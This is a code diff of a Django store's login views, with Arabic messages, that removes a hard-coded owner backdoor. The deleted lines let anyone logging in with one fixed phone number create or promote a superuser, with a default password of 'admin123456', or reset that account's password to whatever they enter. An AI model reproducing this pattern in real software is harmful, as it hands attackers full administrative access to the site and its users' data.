@@ -513,57 +513,13 @@ def user_login(request):
             user = User.objects.filter(phone=phone).order_by('-is_superuser', '-is_staff', '-date_joined').first()
         except Exception:
             user = None
-        if not user and phone == '07700000000':
-            try:
-                existing = User.objects.filter(username='super_owner').first()
-                if existing:
-                    existing.phone = '07700000000'
-                    existing.role = 'admin'
-                    existing.is_staff = True
-                    existing.is_superuser = True
-                    existing.city = existing.city or 'بغداد'
-                    existing.save()
-                    user = existing
-                else:
-                    user = User.objects.create(
-                        username='super_owner',
-                        first_name='صاحب',
-                        last_name='المتجر',
-                        role='admin',
-                        phone='07700000000',
-                        city='بغداد',
-                        is_staff=True,
-                        is_superuser=True
-                    )
-                    user.set_password('admin123456')
-                    user.save()
-            except Exception:
-                user = None
         
         if user:
             user_auth = authenticate(request, username=user.username, password=password)
             if user_auth is not None:
                 login(request, user_auth)
-                if phone == '07700000000':
-                    messages.success(request, 'تم تسجيل دخول المالك بنجاح!')
-                    return redirect('super_owner_dashboard')
                 messages.success(request, 'تم تسجيل الدخول بنجاح!')
                 return redirect('home')
-            if phone == '07700000000':
-                try:
-                    user.username = 'super_owner'
-                    user.is_staff = True
-                    user.is_superuser = True
-                    user.set_password(password)
-                    user.is_active = True
-                    user.save()
-                    user_auth = authenticate(request, username=user.username, password=password)
-                    if user_auth is not None:
-                        login(request, user_auth)
-                        messages.success(request, 'تم تسجيل دخول المالك بنجاح!')
-                        return redirect('super_owner_dashboard')
-                except Exception:
-                    pass
         messages.error(request, 'بيانات الدخول غير صحيحة')
     
     return render(request, 'registration/login.html')
@@ -591,69 +547,18 @@ def owner_login(request):
         except Exception:
             user = None
         if not user:
-            if phone == '07700000000':
-                try:
-                    existing = User.objects.filter(username='super_owner').first()
-                    if existing:
-                        existing.phone = '07700000000'
-                        existing.role = 'admin'
-                        existing.is_staff = True
-                        existing.is_superuser = True
-                        existing.city = existing.city or 'بغداد'
-                        if password:
-                            existing.set_password(password)
-                        existing.save()
-                        user = existing
-                    else:
-                        user = User.objects.create(
-                            username='super_owner',
-                            first_name='صاحب',
-                            last_name='المتجر',
-                            role='admin',
-                            phone='07700000000',
-                            city='بغداد',
-                            is_staff=True,
-                            is_superuser=True
-                        )
-                        user.set_password(password or 'admin123456')
-                        user.save()
-                    messages.success(request, 'تم إنشاء/تحديث حساب المالك وتسجيل الدخول')
-                except Exception:
-                    user = None
-            else:
-                messages.error(request, 'رقم الجوال غير مسجل')
-                return render(request, 'registration/owner_login.html')
+            messages.error(request, 'رقم الجوال غير مسجل')
+            return render(request, 'registration/owner_login.html')
 
         if user:
-            if phone == '07700000000':
-                user.username = 'super_owner'
-                user.is_staff = True
-                user.is_superuser = True
-                user.save()
-            
             user_auth = authenticate(request, username=user.username, password=password)
             if user_auth is not None:
                 login(request, user_auth)
-                if phone == '07700000000':
-                    messages.success(request, 'تم تسجيل دخول المالك بنجاح!')
-                    return redirect('super_owner_dashboard')
-                if user.role == 'admin':
+                if getattr(user, 'is_superuser', False) or getattr(user, 'is_staff', False) or getattr(user, 'role', '') == 'admin':
                     messages.success(request, 'تم تسجيل دخول المدير بنجاح!')
                     return redirect('main_dashboard')
                 messages.error(request, 'ليس لديك صلاحية المدير')
             else:
-                if phone == '07700000000':
-                    try:
-                        user.set_password(password)
-                        user.is_active = True
-                        user.save()
-                        user_auth = authenticate(request, username=user.username, password=password)
-                        if user_auth is not None:
-                            login(request, user_auth)
-                            messages.success(request, 'تم تسجيل دخول المالك بنجاح!')
-                            return redirect('super_owner_dashboard')
-                    except Exception:
-                        pass
                 messages.error(request, 'بيانات الدخول غير صحيحة')
     
     return render(request, 'registration/owner_login.html')
